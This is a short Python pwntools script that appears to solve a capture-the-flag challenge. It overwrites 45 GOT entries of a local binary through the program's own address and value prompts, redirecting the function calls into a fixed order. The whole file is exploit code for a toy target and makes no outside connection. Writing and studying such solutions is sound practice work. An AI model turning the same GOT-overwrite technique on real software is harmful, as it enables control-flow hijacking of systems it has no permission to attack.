#!/usr/bin/env python
from pwn import *

from struct import pack, unpack

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

prog = "./main"
binary = elf.ELF(prog)
funcs = elf.ELF("./libfuncs.so")

funcs_offset = 0x6e6f747269676874

print hex(funcs.symbols["func0"])

conn = process(prog)

def update_func(conn, f1, f2):
	conn.recvuntil("Enter an address (decimal):")
	send(conn, str(binary.got["func"+str(f1)]))

	conn.recvuntil("Enter a value:")
	send(conn, str(funcs_offset + funcs.symbols["func"+str(f2)]))

correct_order = [40, 43, 38, 26, 17, 31, 44, 22, 41, 14, 34, 4, 33, 36, 23, 0, 11, 24, 1, 3, 25, 13, 15, 16, 12, 29, 35, 27, 30, 2, 9, 28, 42, 8, 5, 20, 7, 21, 32, 39, 19, 37, 6, 10, 18]
for f1, f2 in enumerate(correct_order):
	update_func(conn, f1, f2)

send(conn, "0")
print conn.recv()
